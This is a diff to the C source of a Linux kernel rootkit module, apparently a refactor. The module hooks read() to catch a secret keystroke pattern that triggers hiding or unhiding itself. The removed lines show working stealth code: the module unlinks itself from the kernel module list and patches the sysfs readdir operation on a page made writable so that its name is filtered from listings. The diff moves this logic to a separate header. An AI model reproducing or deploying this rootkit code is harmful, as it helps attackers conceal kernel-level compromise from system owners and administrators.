@@ -8,6 +8,7 @@
 #include "sysmap.h"          /* Pointers to system functions */
 #include "global.h"
 #include "hook_read.h"
+#include "hide_module.h"
 
 
 /// sysfs stuff
@@ -21,8 +22,6 @@ int size_of_pattern = sizeof(activate_pattern)-1;
 int cur_position = 0;
 int last_match = -1;
 
-int hidden = 0;
-
 struct list_head tos;
 
 // stuff for "internal command line"
@@ -32,45 +31,6 @@ int  cl_pos = 0;
 // for convenience, I'm using the following notations for fun pointers:
 // fun_<return type>_<arg1>_<arg2>_<arg3>_...
 typedef int (*fun_int_void)(void);
-
-
-/*
- * Hiding a module is basically just removing it from the list of modules
- */
-void hide_me(void)
-{
-    struct list_head *prev;
-    struct list_head *next;
-    if(hidden == 1)
-        return;
-    prev = THIS_MODULE->list.prev;
-    next = THIS_MODULE->list.next;
-    prev->next = next;
-    next->prev = prev;
-    hidden = 1;
-}
-
-
-void unhide_me(void)
-{
-    struct list_head *mods;
-    struct list_head *this_list_head;
-    if(hidden == 0)
-        return;
-
-    mods = (struct list_head *) ptr_modules;
-    this_list_head = &THIS_MODULE->list;
-
-
-    //insert this module into the list of modules (to the front)
-    mods->next->prev = this_list_head; // let prev of the (former) first module point to us
-    this_list_head->next = mods->next; // let our next pointer point to the former first module
-
-    mods->next = this_list_head; // let the modules list next pointer point to us
-    this_list_head->prev = mods; // let out prev pointer point to the modules list
-
-    hidden = 0;
-}
 
 static void handleChar(char c){
     OUR_DEBUG("hooked read!!!!!!!\n");
@@ -83,12 +43,12 @@ static void handleChar(char c){
     } else if (last_match == size_of_pattern-1) { //activate pattern matched, read the actual control command
         if(c == 'h'){ //hide
             OUR_DEBUG("HIDE THIS MODULE");
-            hide_me();
+            hide_module();
             last_match = -1;
             cur_position = 0;
         } else if(c == 'u') { //unhide
             OUR_DEBUG("UNHIDE THIS MODULE");
-            unhide_me();
+            unhide_module();
             last_match = -1;
             cur_position = 0;
         } else {
@@ -131,41 +91,6 @@ static void handle_input(char *buf, int count)
     }
 }
 
-
-int hooked_sysfs_filldir(void* __buf, const char* name, int namelen, loff_t offset, u64 ino, unsigned d_type){
-    if (hidden && strcmp(name, THIS_MODULE->name) == 0){
-        OUR_DEBUG("hooked_sysfs_filldir: %s\n", (char*)name);
-        return 0;
-    }
-    return original_sysfs_filldir(__buf, name, namelen, offset, ino, d_type);
-}
-
-int hooked_sysfs_readdir(struct file * filp, void* dirent, filldir_t filldir){
-    OUR_DEBUG("Hooked sysfs_readdir.\n");
-    original_sysfs_filldir = filldir;
-    return original_sysfs_readdir(filp, dirent, hooked_sysfs_filldir);
-}
-
-
-void hook_sysfs(void){
-    struct file_operations* sysfs_dir_ops;
-    sysfs_dir_ops = (struct file_operations*)ptr_sysfs_dir_operations;
-    original_sysfs_readdir = sysfs_dir_ops->readdir;
-    make_page_writable((long unsigned int) sysfs_dir_ops);
-    sysfs_dir_ops->readdir = hooked_sysfs_readdir;
-    make_page_readonly((long unsigned int) sysfs_dir_ops);
-}
-
-
-void unhook_sysfs(void){
-    struct file_operations* sysfs_dir_ops;
-    sysfs_dir_ops = (struct file_operations*)ptr_sysfs_dir_operations;
-    make_page_writable((long unsigned int) sysfs_dir_ops);
-    sysfs_dir_ops->readdir = original_sysfs_readdir;
-    make_page_readonly((long unsigned int) sysfs_dir_ops);
-}
-
-
 /* Initialization routine */
 static int __init _init_module(void)
 {
@@ -175,7 +100,7 @@ static int __init _init_module(void)
 
     return 0;
 }
-fuck you
+
 /* Exiting routine */
 static void __exit _cleanup_module(void)
 {
